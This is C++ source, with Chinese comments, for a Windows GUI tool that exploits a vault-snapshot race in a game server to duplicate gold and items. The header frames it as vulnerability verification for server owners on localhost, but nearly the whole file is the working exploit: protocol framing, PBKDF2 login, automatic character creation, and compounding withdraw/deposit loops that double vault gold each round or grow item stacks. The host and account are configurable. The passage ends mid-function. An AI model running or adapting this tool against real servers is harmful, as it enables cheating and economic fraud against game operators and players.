// cargo_dupe.cpp
// cargo_maxexp 的 C++/Win32 图形化版本(独立 TCP 客户端,不需要 hook/DLL 注入)。
// 用途:验证 ServerS4A21 账号金库(AccountCargo)双角色快照不一致导致的金币/物品复制漏洞。
// 仅限服务器所有者在自己的环境(默认 127.0.0.1)做漏洞验证。
//
// 机制:同账号双角色同时在线,各自持有选角时载入的金库内存快照;账号金库无账号级互斥,
// 落库无条件覆盖 → 后取者基于陈旧快照再取一次,一份资产发两次。
//
// 状态来源(全部来自服务端回包,不读数据库):
//   选角后服务端推送 ITEM_LIST(noti 0x00/0x000D):
//     Main(0)         : u8 listType + u16 param + u16 count + 101B/条
//                       条目 = i16 slot + i32 itemId + i32 value(count);slot 0=金币
//     AccountCargo(12): u8 listType + u16 key + i32 Money + u16 count + 101B/条
//   存/取 ack(0x0133/0x0134): 01 + i32 新金库金币(失败 00 0A)
//   MOVE ack(0x0013): 01 | srcType | srcSlot(2) | moveVal(4) | dstType | dstSlot(2, 偏移9)
//
// 功能:
//   金币复制 —— 两角色金币全部入金库做本金,每轮金库翻倍,复制一次超 int32 即停
//   物品复制 —— 指定 itemId + 目标数量,整栈复利增长到满栈,之后收割轮每轮净增一整栈
//
// 界面输入(HOST/端口/账号/密码/物品ID/目标数量)对应可变参数;密码明文输入,
// 发送前本地计算 PBKDF2 hash。执行在后台线程,日志区实时输出每一步。

#ifndef UNICODE
#define UNICODE
#endif
#ifndef _UNICODE
#define _UNICODE
#endif
#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>

#include <algorithm>
#include <cstdint>
#include <cstdarg>
#include <functional>
#include <map>
#include <memory>
#include <string>
#include <vector>

#include "gameproto.h"
#include "pbkdf2_sha256.h"

#pragma comment(lib, "ws2_32.lib")

namespace {

constexpr wchar_t kClassName[] = L"A21CargoDupeWindow";
constexpr UINT WM_EXP_FINISHED = WM_APP + 1;

constexpr int IDC_HOST = 1001;
constexpr int IDC_PORT = 1002;
constexpr int IDC_MID = 1003;
constexpr int IDC_PWD = 1004;
constexpr int IDC_ITEM = 1005;
constexpr int IDC_TARGET = 1006;
constexpr int IDC_MODE_GOLD = 1007;
constexpr int IDC_MODE_ITEM = 1008;
constexpr int IDC_RUN = 1009;
constexpr int IDC_STOP = 1010;
constexpr int IDC_LOG = 1011;

HINSTANCE g_hinst = nullptr;
HWND g_hwnd = nullptr;
HWND g_edHost = nullptr;
HWND g_edPort = nullptr;
HWND g_edMid = nullptr;
HWND g_edPwd = nullptr;
HWND g_edItem = nullptr;
HWND g_edTarget = nullptr;
HWND g_btnRun = nullptr;
HWND g_btnStop = nullptr;
HWND g_log = nullptr;
bool g_running = false;
volatile bool g_stop = false;

struct ExpParams {
    std::wstring host;
    int port;
    std::wstring mid;
    std::wstring pwd;      // 明文密码,发送前本地计算 PBKDF2 hash
    bool goldMode;
    long itemId;
    long target;
};

// ---------------------------------------------------------------------------
// 协议常量
// ---------------------------------------------------------------------------
constexpr uint16_t T_LOGIN = 0x0001;
constexpr uint16_t T_SELECT = 0x0004;
constexpr uint16_t T_CREATE = 0x0005;
constexpr uint16_t T_MOVE = 0x0013;
constexpr uint16_t T_CREATE_CARGO = 0x0131;
constexpr uint16_t T_DEPOSIT = 0x0133;
constexpr uint16_t T_WITHDRAW = 0x0134;

constexpr uint16_t N_ITEM_LIST = 0x000D;

constexpr int MAIN = 0;
constexpr int ACCOUNT_CARGO = 12;
constexpr int ENTRY = 101;        // A21CommonEntrySize

constexpr int32_t INT32_MAX_V = 0x7FFFFFFF;
constexpr int32_t STACK_CAP = 32767;

// main 背包按 item kind 分区的槽位区间(物归其区,否则 InvalidDestinationSlot)
const std::map<int, std::pair<int, int>> KIND_RANGE = {
    {1, {9, 64}}, {2, {65, 120}}, {3, {121, 176}}, {4, {177, 232}}, {6, {233, 288}},
};

// ---------------------------------------------------------------------------
// 日志(跨线程:SendMessage 到 UI 线程)
// ---------------------------------------------------------------------------
void LogLine(const std::wstring& msg) {
    if (!g_log) return;
    wchar_t timebuf[64];
    SYSTEMTIME st;
    GetLocalTime(&st);
    swprintf(timebuf, L"[%02u:%02u:%02u] ", st.wHour, st.wMinute, st.wSecond);
    std::wstring line = std::wstring(timebuf) + msg + L"\r\n";
    SendMessageW(g_log, EM_SETSEL, static_cast<WPARAM>(-1), static_cast<WPARAM>(-1));
    SendMessageW(g_log, EM_REPLACESEL, FALSE, reinterpret_cast<LPARAM>(line.c_str()));
}

void LogFmt(const wchar_t* fmt, ...) {
    wchar_t buf[2048];
    va_list ap;
    va_start(ap, fmt);
    _vsnwprintf_s(buf, 2048, _TRUNCATE, fmt, ap);
    va_end(ap);
    LogLine(buf);
}

void LogHex(const wchar_t* prefix, const std::vector<uint8_t>& data, size_t maxBytes = 64) {
    std::wstring hex;
    size_t n = (std::min)(data.size(), maxBytes);
    wchar_t tmp[8];
    for (size_t i = 0; i < n; ++i) {
        swprintf(tmp, L"%02X", data[i]);
        hex += tmp;
    }
    if (data.size() > n) hex += L"...";
    LogFmt(L"%s %s", prefix, hex.c_str());
}

// ---------------------------------------------------------------------------
// 协议辅助(与 Python 版逐字节一致)
// ---------------------------------------------------------------------------
std::vector<uint8_t> DStr(const std::string& s) {
    std::vector<uint8_t> out;
    uint32_t len = static_cast<uint32_t>(s.size());
    for (int i = 0; i < 4; ++i) out.push_back(static_cast<uint8_t>((len >> (8 * i)) & 0xFF));
    out.insert(out.end(), s.begin(), s.end());
    return out;
}

void PutI32(std::vector<uint8_t>& v, int32_t x) {
    uint32_t u = static_cast<uint32_t>(x);
    for (int i = 0; i < 4; ++i) v.push_back(static_cast<uint8_t>((u >> (8 * i)) & 0xFF));
}

bool SendAll(SOCKET s, const std::vector<uint8_t>& data) {
    size_t off = 0;
    while (off < data.size()) {
        int n = send(s, reinterpret_cast<const char*>(data.data() + off),
                     static_cast<int>(data.size() - off), 0);
        if (n <= 0) return false;
        off += static_cast<size_t>(n);
    }
    return true;
}

// 收包直到静默:第一次等待 firstMs,之后每次收到数据把超时缩到 idleMs。
bool RecvQuiet(SOCKET s, std::vector<uint8_t>& out, int firstMs, int idleMs) {
    out.clear();
    int timeoutMs = firstMs;
    char buf[65536];
    while (true) {
        fd_set fds;
        FD_ZERO(&fds);
        FD_SET(s, &fds);
        timeval tv;
        tv.tv_sec = timeoutMs / 1000;
        tv.tv_usec = (timeoutMs % 1000) * 1000;
        int r = select(0, &fds, nullptr, nullptr, &tv);
        if (r <= 0) break;
        int n = recv(s, buf, sizeof(buf), 0);
        if (n <= 0) break;
        out.insert(out.end(), buf, buf + n);
        timeoutMs = idleMs;
    }
    return !out.empty();
}

int16_t GetI16(const std::vector<uint8_t>& b, size_t off) {
    return static_cast<int16_t>(b[off] | (b[off + 1] << 8));
}

uint16_t GetU16(const std::vector<uint8_t>& b, size_t off) {
    return static_cast<uint16_t>(b[off] | (b[off + 1] << 8));
}

int32_t GetI32(const std::vector<uint8_t>& b, size_t off) {
    return static_cast<int32_t>(static_cast<uint32_t>(b[off]) |
                                (static_cast<uint32_t>(b[off + 1]) << 8) |
                                (static_cast<uint32_t>(b[off + 2]) << 16) |
                                (static_cast<uint32_t>(b[off + 3]) << 24));
}

// 按 15B 服务端帧头迭代:cmd u8 + type u16 + len u32 + 8B 保留 + body。
// onFrame(cmd, type, bodyOff, bodyLen);返回 false 中止。
void IterFrames(const std::vector<uint8_t>& buf,
                const std::function<bool(uint8_t, uint16_t, size_t, size_t)>& onFrame) {
    size_t i = 0;
    while (i + 15 <= buf.size()) {
        uint16_t t = GetU16(buf, i + 1);
        uint32_t ln = static_cast<uint32_t>(GetI32(buf, i + 3));
        if (ln < 15 || i + ln > buf.size()) break;
        if (!onFrame(buf[i], t, i + 15, ln - 15)) return;
        i += ln;
    }
}

bool AckOk(const std::vector<uint8_t>& buf) {
    return !buf.empty() && buf[0] == 0x01;
}

// 在回包缓冲里找指定 cmd/type 的帧 body
std::vector<uint8_t> FindAck(const std::vector<uint8_t>& buf, uint16_t ptype, uint8_t cmd = 0x01) {
    std::vector<uint8_t> out;
    IterFrames(buf, [&](uint8_t c, uint16_t t, size_t off, size_t len) {
        if (c == cmd && t == ptype) {
            out.assign(buf.begin() + static_cast<ptrdiff_t>(off),
                       buf.begin() + static_cast<ptrdiff_t>(off + len));
            return false;
        }
        return true;
    });
    return out;
}

// ---------------------------------------------------------------------------
// 会话:状态视图全部来自服务端回包解析 + 成功操作的簿记
// ---------------------------------------------------------------------------
struct ItemStack {
    int32_t iid = 0;
    int32_t count = 0;
};

struct Session {
    SOCKET s = INVALID_SOCKET;
    int slot = 0;
    uint16_t seq = 0;
    int32_t gold = 0;                 // 角色金币
    int32_t cargoGold = 0;            // 金库金币
    std::map<int, ItemStack> mainItems;   // slot -> (itemId, count)
    std::map<int, ItemStack> cargoItems;  // slot -> (itemId, count)
    bool stateFresh = false;          // 最近一次 reload 是否刷新到了金库视图

    explicit Session(int slotIndex) : slot(slotIndex) { Relog(); }
    ~Session() { Close(); }

    void Close() {
        if (s != INVALID_SOCKET) {
            closesocket(s);
            s = INVALID_SOCKET;
        }
    }

    uint16_t NextSeq() { return ++seq; }

    // 发送一帧并收净回包
    std::vector<uint8_t> Send(uint16_t ptype, const std::vector<uint8_t>& body, int firstMs = 3000) {
        std::vector<uint8_t> r;
        if (s == INVALID_SOCKET) return r;
        if (!SendAll(s, proto::game_frame(ptype, body, NextSeq()))) return r;
        RecvQuiet(s, r, firstMs, 400);
        return r;
    }

    void Absorb(const std::vector<uint8_t>& buf) {
        bool fresh = false;
        int32_t newGold = -1;
        int32_t newCargoGold = 0;
        std::map<int, ItemStack> newMain, newCargo;
        IterFrames(buf, [&](uint8_t c, uint16_t t, size_t off, size_t len) {
            if (c != 0x00 || t != N_ITEM_LIST || len < 5) return true;
            uint8_t lt = buf[off];
            if (lt == MAIN) {
                uint16_t count = GetU16(buf, off + 3);
                if (len != 5 + static_cast<size_t>(count) * ENTRY) {
                    LogFmt(L"    [!] Main ITEM_LIST 长度不符(count=%u len=%zu),跳过解析", count, len);
                    return true;
                }
                bool gotGold = false;
                int32_t g = 0;
                for (uint16_t k = 0; k < count; ++k) {
                    size_t e = off + 5 + static_cast<size_t>(k) * ENTRY;
                    int16_t sl = GetI16(buf, e);
                    int32_t iid = GetI32(buf, e + 2);
                    int32_t val = GetI32(buf, e + 6);
                    if (0 <= sl && sl <= 2) {
                        if (sl == 0) { g = val; gotGold = true; }
                    } else {
                        newMain[sl] = {iid, val};
                    }
                }
                if (gotGold) { newGold = g; }
                mainItems = std::move(newMain);
            } else if (lt == ACCOUNT_CARGO) {
                if (len < 9) return true;
                int32_t money = GetI32(buf, off + 3);
                uint16_t count = GetU16(buf, off + 7);
                if (len != 9 + static_cast<size_t>(count) * ENTRY) {
                    LogFmt(L"    [!] AccountCargo ITEM_LIST 长度不符(count=%u len=%zu),跳过解析",
                           count, len);
                    return true;
                }
                newCargo.clear();
                for (uint16_t k = 0; k < count; ++k) {
                    size_t e = off + 9 + static_cast<size_t>(k) * ENTRY;
                    int16_t sl = GetI16(buf, e);
                    int32_t iid = GetI32(buf, e + 2);
                    int32_t val = GetI32(buf, e + 6);
                    newCargo[sl] = {iid, val};
                }
                newCargoGold = money;
                cargoItems = std::move(newCargo);
                fresh = true;
            }
            return true;
        });
        if (newGold >= 0) gold = newGold;
        cargoGold = fresh ? newCargoGold : cargoGold;
        stateFresh = fresh;
    }

    bool ConnectAndLogin() {
        stateFresh = false;
        std::string hostA = HostA();
        sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons(static_cast<u_short>(Port()));
        if (InetPtonA(AF_INET, hostA.c_str(), &addr.sin_addr) != 1) {
            LogLine(L"[!] HOST 解析失败(需要 IPv4 地址,如 127.0.0.1)");
            return false;
        }
        s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (s == INVALID_SOCKET) return false;
        DWORD sendTimeout = 5000;
        setsockopt(s, SOL_SOCKET, SO_SNDTIMEO, reinterpret_cast<const char*>(&sendTimeout),
                   sizeof(sendTimeout));
        if (connect(s, reinterpret_cast<sockaddr*>(&addr), sizeof(addr)) != 0) {
            LogFmt(L"[!] 连接失败 WSAGetLastError=%d", WSAGetLastError());
            Close();
            return false;
        }
        std::vector<uint8_t> r;
        RecvQuiet(s, r, 3000, 600);   // banner
        return true;
    }

    // 由工作线程在创建前注入,避免到处传参
    static std::string MidA;
    static std::string PwdHashHex;
    static std::string HostA_;
    static int Port_;

    void Relog() {
        if (s != INVALID_SOCKET) Close();
        if (!ConnectAndLogin()) return;
        Send(T_LOGIN, LoginBody(), 3000);
        std::vector<uint8_t> r = Send(T_SELECT, SlotBody(), 4000);
        Sleep(300);
        std::vector<uint8_t> tail;
        RecvQuiet(s, tail, 1000, 300);
        r.insert(r.end(), tail.begin(), tail.end());
        Absorb(r);
    }

    void Reselect() {
        stateFresh = false;
        std::vector<uint8_t> r = Send(T_SELECT, SlotBody(), 4000);
        Sleep(200);
        std::vector<uint8_t> tail;
        RecvQuiet(s, tail, 800, 300);
        r.insert(r.end(), tail.begin(), tail.end());
        Absorb(r);
    }

    void Reload() { Reselect(); }

    std::vector<uint8_t> SlotBody() const {
        return {static_cast<uint8_t>(slot & 0xFF), static_cast<uint8_t>((slot >> 8) & 0xFF)};
    }

    static std::vector<uint8_t> LoginBody() {
        std::vector<uint8_t> b = DStr(MidA);
        std::vector<uint8_t> h = DStr(PwdHashHex);
        b.insert(b.end(), h.begin(), h.end());
        return b;
    }

    // 存/取 ack: 01 + i32 新金库金币(失败 00 0A)
    bool Withdraw(int32_t amount) {
        std::vector<uint8_t> body;
        PutI32(body, amount);
        std::vector<uint8_t> ack = FindAck(Send(T_WITHDRAW, body), T_WITHDRAW);
        if (AckOk(ack) && ack.size() >= 5) {
            cargoGold = GetI32(ack, 1);
            return true;
        }
        return false;
    }

    bool Deposit(int32_t amount) {
        std::vector<uint8_t> body;
        PutI32(body, amount);
        std::vector<uint8_t> ack = FindAck(Send(T_DEPOSIT, body), T_DEPOSIT);
        if (AckOk(ack) && ack.size() >= 5) {
            cargoGold = GetI32(ack, 1);
            return true;
        }
        return false;
    }

    bool CreateCargo() {
        return AckOk(FindAck(Send(T_CREATE_CARGO, {}), T_CREATE_CARGO));
    }

    // MOVE ack: 01 | srcType(1) | srcSlot(2) | moveVal(4) | dstType(1) | dstSlot(2, 偏移9)
    std::vector<uint8_t> Move(int srcType, int srcSlot, int32_t count, int dstType, int dstSlot) {
        std::vector<uint8_t> body;
        body.push_back(static_cast<uint8_t>(srcType));
        body.push_back(static_cast<uint8_t>(srcSlot & 0xFF));
        body.push_back(static_cast<uint8_t>((srcSlot >> 8) & 0xFF));
        PutI32(body, 0);
        PutI32(body, count);
        body.push_back(static_cast<uint8_t>(dstType));
        body.push_back(static_cast<uint8_t>(dstSlot & 0xFF));
        body.push_back(static_cast<uint8_t>((dstSlot >> 8) & 0xFF));
        return FindAck(Send(T_MOVE, body), T_MOVE);
    }
};

std::string Session::MidA;
std::string Session::PwdHashHex;
std::string Session::HostA_;
int Session::Port_ = 10011;

// ---------------------------------------------------------------------------
// 通用
// ---------------------------------------------------------------------------
void CreateCharacter(const std::string& name) {
    SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (s == INVALID_SOCKET) return;
    sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(static_cast<u_short>(Session::Port_));
    if (InetPtonA(AF_INET, Session::HostA_.c_str(), &addr.sin_addr) != 1) {
        closesocket(s);
        return;
    }
    if (connect(s, reinterpret_cast<sockaddr*>(&addr), sizeof(addr)) != 0) {
        closesocket(s);
        return;
    }
    std::vector<uint8_t> r;
    RecvQuiet(s, r, 3000, 600);
    SendAll(s, proto::game_frame(T_LOGIN, Session::LoginBody(), 1));
    RecvQuiet(s, r, 3000, 600);
    std::vector<uint8_t> body;
    body.push_back(0);   // job
    PutI32(body, static_cast<int32_t>(name.size()));
    body.insert(body.end(), name.begin(), name.end());
    body.push_back(0);
    SendAll(s, proto::game_frame(T_CREATE, body, 2));
    RecvQuiet(s, r, 3000, 600);
    closesocket(s);
}

// 探测 slot 0..5,返回选角成功的会话(最多 2 个)
std::vector<std::unique_ptr<Session>> ProbeSessions() {
    std::vector<std::unique_ptr<Session>> found;
    for (int slot = 0; slot < 6; ++slot) {
        auto s = std::make_unique<Session>(slot);
        if (s->s == INVALID_SOCKET) {
            LogFmt(L"[setup] slot%d 连接失败", slot);
            break;
        }
        if (s->stateFresh) {
            LogFmt(L"[setup] slot%d: 角色在线(金币 %d, 金库 %d, 背包 %zu 件, 金库物品 %zu 件)",
                   slot, s->gold, s->cargoGold, s->mainItems.size(), s->cargoItems.size());
            found.push_back(std::move(s));
            if (found.size() == 2) break;
        } else {
            LogFmt(L"[setup] slot%d: 空槽位", slot);
            s->Close();
        }
    }
    return found;
}

std::vector<std::unique_ptr<Session>> EnsureTwoSessions() {
    auto ss = ProbeSessions();
    if (ss.size() < 2) {
        LogLine(L"[setup] 角色不足 2 个,创建 duptest2 ...");
        CreateCharacter("duptest2");
        Sleep(500);
        ss = ProbeSessions();
    }
    if (ss.size() < 2) {
        LogLine(L"[x] 可用角色不足 2 个,终止");
    }
    return ss;
}

bool SafeWithdraw(Session& sess, int32_t amount) {
    if (sess.Withdraw(amount)) return true;
    LogFmt(L"    [!] slot%d 取金失败,降级为完整重登后重试...", sess.slot);
    sess.Relog();
    return sess.Withdraw(amount);
}

int KindOfSlot(int slot) {
    for (const auto& [k, range] : KIND_RANGE) {
        if (range.first <= slot && slot <= range.second) return k;
    }
    return 0;
}

// 物品位于 main(src_slot)(如快捷槽 3-8,不在标准分区)时,
// 通过「金库往返 + 逐区间试探目标槽」可逆探测其 kind。全程不留痕。
// 返回 kind 或 0。探测后调用 Reselect() 重新同步簿记。
int DetectKind(Session& sess, int srcSlot) {
    int cs = -1;
    for (int x = 0; x < 64; ++x) {
        if (sess.cargoItems.find(x) == sess.cargoItems.end()) { cs = x; break; }
    }
    if (cs < 0) return 0;
    if (!AckOk(sess.Move(MAIN, srcSlot, 1, ACCOUNT_CARGO, cs))) return 0;
    int kind = 0;
    for (const auto& [k, range] : KIND_RANGE) {
        int dst = -1;
        for (int x = range.first; x <= range.second; ++x) {
            if (sess.mainItems.find(x) == sess.mainItems.end() && x != srcSlot) { dst = x; break; }
        }
        if (dst < 0) continue;
        if (AckOk(sess.Move(ACCOUNT_CARGO, cs, 1, MAIN, dst))) {
            kind = k;
            sess.Move(MAIN, dst, 1, ACCOUNT_CARGO, cs);   // 替回金库
            break;
        }
    }
    sess.Move(ACCOUNT_CARGO, cs, 1, MAIN, srcSlot);       // 金库那份移回原槽
    sess.Reselect();
    return kind;
}

int EmptyMain(Session& sess, int kind) {
    auto it = KIND_RANGE.find(kind);
    int lo = it != KIND_RANGE.end() ? it->second.first : 3;
    int hi = it != KIND_RANGE.end() ? it->second.second : 352;
    for (int s = lo; s <= hi; ++s) {
        if (sess.mainItems.find(s) == sess.mainItems.end()) return s;
    }
    return -1;
}

// 金库 -> 主背包,返回主背包真实落点槽位(解析 ack 归一化);失败返回 -1。含簿记。
int TakeFromCargo(Session& sess, int32_t iid, int cargoSlot, int32_t n, int kind) {
    int dst = EmptyMain(sess, kind);
    if (dst < 0) {
        LogFmt(L"    [!] slot%d kind=%d 区间无可用的空槽", sess.slot, kind);
        return -1;
    }
    std::vector<uint8_t> ack = sess.Move(ACCOUNT_CARGO, cargoSlot, n, MAIN, dst);
    if (!AckOk(ack)) {
        LogHex(L"    [!] 取物失败 ack=", ack);
        return -1;
    }
    int realDst = ack.size() >= 11 ? GetI16(ack, 9) : dst;
    auto ci = sess.cargoItems.find(cargoSlot);
    if (ci != sess.cargoItems.end()) {
        if (ci->second.count <= n) sess.cargoItems.erase(ci);
        else ci->second.count -= n;
    }
    // 堆叠合并:记录到真实落点槽(可能不是请求的 dst)
    auto mi = sess.mainItems.find(realDst);
    if (mi == sess.mainItems.end()) {
        sess.mainItems[realDst] = {iid, n};
    } else {
        mi->second.count += n;
    }
    return realDst;
}

// 主背包 -> 金库。含簿记(成功才记,按实际数量扣减)。
bool PutToCargo(Session& sess, int32_t iid, int mainSlot, int32_t n, int cargoSlot) {
    std::vector<uint8_t> ack = sess.Move(MAIN, mainSlot, n, ACCOUNT_CARGO, cargoSlot);
    if (!AckOk(ack)) return false;
    auto mi = sess.mainItems.find(mainSlot);
    if (mi != sess.mainItems.end()) {
        if (mi->second.count <= n) sess.mainItems.erase(mi);
        else mi->second.count -= n;
    }
    auto ci = sess.cargoItems.find(cargoSlot);
    if (ci != sess.cargoItems.end()) ci->second.count += n;
    else sess.cargoItems[cargoSlot] = {iid, n};
    return true;
}

// ---------------------------------------------------------------------------
// 金币:复利复制
// ---------------------------------------------------------------------------
void RunGold(int32_t target) {
    auto ss = EnsureTwoSessions();
    if (ss.size() < 2) return;
    Session& A = *ss[0];
    Session& B = *ss[1];

    LogFmt(L"[setup] CREATE_ACCOUNT_CARGO: %s",
           A.CreateCargo() ? L"ok" : L"fail(可能已存在)");
    A.Relog();
    Sleep(300);

    // 效率优先:把两个角色的金币全部存入金库,作为复利初始本金
    for (Session* s : {&A, &B}) {
        if (s->gold > 0) {
            bool ok = s->Deposit(s->gold);
            LogFmt(L"[setup] slot%d 存入全部金币 %d: %s", s->slot, s->gold,
                   ok ? L"ok" : L"fail");
            s->Relog();
            Sleep(300);
        }
    }

    LogFmt(L"[gold] 开始复利复制,target=%d(复制一次超 int32 即停,安全边界 C≤%d)",
           target, INT32_MAX_V / 2);
    int32_t C = A.cargoGold;
    int cycle = 0;
    int anomaly = 0;
    while (!g_stop) {
        if (C > INT32_MAX_V / 2 || C >= target || C <= 0) break;
        A.Reload();
        B.Reload();
        // 回包解析到的金库值是权威值,覆盖本地推算
        if (A.stateFresh) C = A.cargoGold;
        if (B.stateFresh) C = B.cargoGold;
        ++cycle;
        LogFmt(L"[gold] 第%d轮: 金库 C=%d → 本轮净产出预计 +%d", cycle, C, C);
        if (!SafeWithdraw(A, C)) { LogLine(L"[gold] A 取金失败,终止"); break; }
        if (!SafeWithdraw(B, C)) { LogLine(L"[gold] B 取金失败,终止"); break; }
        if (!A.Deposit(C)) { LogLine(L"[gold] A 放回失败,终止"); break; }
        B.Reload();
        if (!B.Deposit(C)) { LogLine(L"[gold] B 放回失败,终止"); break; }
        int32_t C2 = B.cargoGold;   // ack 带回来的真实新金库值
        if (C2 != 2 * C) {
            ++anomaly;
            LogFmt(L"[gold] [!] 金库增长异常: 预期 2C=%d, 实际 ack=%d(重选角可能未生效)",
                   2 * C, C2);
            A.Relog();
            B.Relog();
            C = A.cargoGold;
            if (anomaly >= 2) { LogLine(L"[gold] 连续两轮异常,终止"); break; }
            continue;
        }
        anomaly = 0;
        C = C2;
        Sleep(300);
    }
    if (g_stop) LogLine(L"[gold] 用户停止");

    A.Relog();
    B.Relog();
    LogFmt(L"[gold] 完成: 共 %d 轮", cycle);
    LogFmt(L"[gold] 金库=%d charA=%d charB=%d", A.cargoGold, A.gold, B.gold);
    LogFmt(L"[gold] 账号总金币 = %d", A.cargoGold + A.gold + B.gold);
}

// ---------------------------------------------------------------------------
// 物品:整栈复利复制
// ---------------------------------------------------------------------------
void RunItem(int32_t iid, int32_t target) {
    auto ss = EnsureTwoSessions();
    if (ss.size() < 2) return;

    // 找物品所在角色:A=持有物品的角色,B=另一个
    Session* A = nullptr;
    int slotSrc = -1;
    int32_t have = 0;
    for (auto& s : ss) {
        for (const auto& [slot, st] : s->mainItems) {
            if (st.iid == iid && st.count > 0) {
                A = s.get();
                slotSrc = slot;
                have = st.count;
                break;
            }
        }
        if (A) break;
    }
    if (!A) {
        LogFmt(L"[item] 两个角色背包里都找不到 itemId=%d,无法播种", iid);
        return;
    }
    Session* B = (ss[0].get() == A) ? ss[1].get() : ss[0].get();

    int kind = KindOfSlot(slotSrc);
    if (kind == 0) {
        LogFmt(L"[item] 槽位 %d 不在标准分区(如快捷槽 3-8),改用可逆探测确定 kind...", slotSrc);
        kind = DetectKind(*A, slotSrc);
        if (kind == 0) {
            LogLine(L"[item] 探测失败: 该物品可能不允许入金库,或无可用目标分区");
            return;
        }
        LogFmt(L"[item] 探测得 kind=%d", kind);
        B->Reselect();
    }
    LogFmt(L"[item] 目标 itemId=%d kind=%d slot%d main%d 现有 %d", iid, kind, A->slot,
           slotSrc, have);
    LogFmt(L"[item] 当前金库物品 %zu 件", A->cargoItems.size());

    // 播种:金库已有该物品直接用;否则找空金库槽位,把物品移入(≥1 份)
    int cargoSlot = -1;
    for (const auto& [slot, st] : A->cargoItems) {
        if (st.iid == iid && st.count > 0) {
            cargoSlot = slot;
            LogFmt(L"[item] 金库已有该物品 x%d(槽位 %d),直接作为起点", st.count, slot);
            break;
        }
    }
    if (cargoSlot < 0) {
        for (int x = 0; x < 64; ++x) {
            if (A->cargoItems.find(x) == A->cargoItems.end()) { cargoSlot = x; break; }
        }
        if (cargoSlot < 0) {
            LogLine(L"[item] 金库 64 个槽位全满,无法播种");
            return;
        }
        int32_t n = (std::min)(have, (std::min)(STACK_CAP, target));
        if (!PutToCargo(*A, iid, slotSrc, n, cargoSlot)) {
            LogLine(L"[item] 播种失败(该物品可能不允许入金库)");
            return;
        }
        LogFmt(L"[item] 播种: slot%d main%d -> 金库槽%d x%d", A->slot, slotSrc, cargoSlot, n);
    }

    auto cargoCount = [&](Session* s) -> int32_t {
        auto it = s->cargoItems.find(cargoSlot);
        return it != s->cargoItems.end() ? it->second.count : 0;
    };
    auto totalIid = [&]() -> int32_t {
        int64_t n = cargoCount(A);
        for (Session* s : {A, B}) {
            for (const auto& [slot, st] : s->mainItems) {
                if (st.iid == iid) n += st.count;
            }
        }
        return static_cast<int32_t>((std::min)(n, static_cast<int64_t>(INT32_MAX_V)));
    };

    // ---- 增长轮:金库 C → C+step(取 2×step 放 2×step,一份留存为净增) ----
    int cycle = 0;
    int32_t prevC = -1;
    int stall = 0;
    while (!g_stop) {
        int32_t C = cargoCount(A);
        if (C >= (std::min)(STACK_CAP, target)) break;
        if (C <= 0) { LogLine(L"[item] 金库中该物品数量为 0,终止增长"); break; }
        if (C == prevC) {
            ++stall;
            if (stall == 1) {
                LogFmt(L"[item] 金库值未增长(C=%d,重选角可能未生效),整线重登重试...", C);
                A->Relog();
                B->Relog();
                continue;
            }
            LogLine(L"[item] 重登后金库值仍无增长,终止");
            break;
        }
        stall = 0;
        prevC = C;
        int32_t step = (std::min)(C, (std::min)(STACK_CAP - C, target - C));
        ++cycle;
        LogFmt(L"[item] 增长第%d轮: 金库 C=%d step=%d", cycle, C, step);
        A->Reload();
        B->Reload();
        int sA = TakeFromCargo(*A, iid, cargoSlot, step, kind);
        if (sA < 0) break;
        int sB = TakeFromCargo(*B, iid, cargoSlot, step, kind);
        if (sB < 0) break;
        if (!PutToCargo(*A, iid, sA, step, cargoSlot)) {
            LogLine(L"[item] A 放回失败,终止");
            break;
        }
        B->Reload();
        if (!PutToCargo(*B, iid, sB, step, cargoSlot)) {
            LogLine(L"[item] B 放回失败,终止");
            break;
        }
        // 本轮净效果:金库 C → C+step(A/B 各自视图仍是 C,DB 已被 B 的提交覆盖为 C+step)
        A->cargoItems[cargoSlot] = {iid, C + step};
        Sleep(200);
    }

    // ---- 收割轮:金库保持满栈,每轮净增一个整栈(放回时合并超上限被拒,副本留在角色背包) ----
    while (!g_stop && totalIid() < target) {
        int32_t C = cargoCount(A);
        if (C <= 0) { LogLine(L"[item] 金库无该物品,终止收割"); break; }
        ++cycle;
        A->Reload();
        B->Reload();
        int sA = TakeFromCargo(*A, iid, cargoSlot, C, kind);
        if (sA < 0) break;
        int sB = TakeFromCargo(*B, iid, cargoSlot, C, kind);
        if (sB < 0) break;
        if (!PutToCargo(*A, iid, sA, C, cargoSlot)) {
            LogLine(L"[item] A 放回失败,终止");
            break;
        }
        B->Reload();
        if (!PutToCargo(*B, iid, sB, C, cargoSlot)) {
            // 预期失败:满栈合并被拒,本轮复制的整栈留在角色背包
        }
        LogFmt(L"[item] 收割第%d轮: 全库总数量 = %d", cycle, totalIid());
        Sleep(200);
    }
    if (g_stop) LogLine(L"[item] 用户停止");

    int32_t inA = 0, inB = 0;
    for (const auto& [slot, st] : A->mainItems) if (st.iid == iid) inA += st.count;
    for (const auto& [slot, st] : B->mainItems) if (st.iid == iid) inB += st.count;
    LogFmt(L"[item] 完成: 全库总数量 %d(金库 %d, slot%d 背包 %d, slot%d 背包 %d)",
           totalIid(), cargoCount(A), A->slot, inA, B->slot, inB);
}

// ---------------------------------------------------------------------------
// 工作线程
// ---------------------------------------------------------------------------
DWORD WINAPI ExpThread(LPVOID param) {
    auto* p = static_cast<ExpParams*>(param);
    ExpParams prm = *p;
    delete p;

    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);

    std::string midA(prm.mid.begin(), prm.mid.end());
    std::string pwdA(prm.pwd.begin(), prm.pwd.end());
    Session::MidA = midA;
    Session::HostA_.assign(prm.host.begin(), prm.host.end());
    Session::Port_ = prm.port;
    Session::PwdHashHex = a21hash::Derive(midA, pwdA);

    LogFmt(L"[*] 目标 %s:%d  账号 %s  模式 %s", prm.host.c_str(), prm.port,
           prm.mid.c_str(), prm.goldMode ? L"金币复制(拉到上限)" : L"物品复制");
    LogFmt(L"[*] derived hash: %S", Session::PwdHashHex.c_str());

    if (prm.goldMode) {
        RunGold(INT32_MAX_V / 2);
    } else {
        RunItem(static_cast<int32_t>(prm.itemId), static_cast<int32_t>(prm.target));
    }

    WSACleanup();
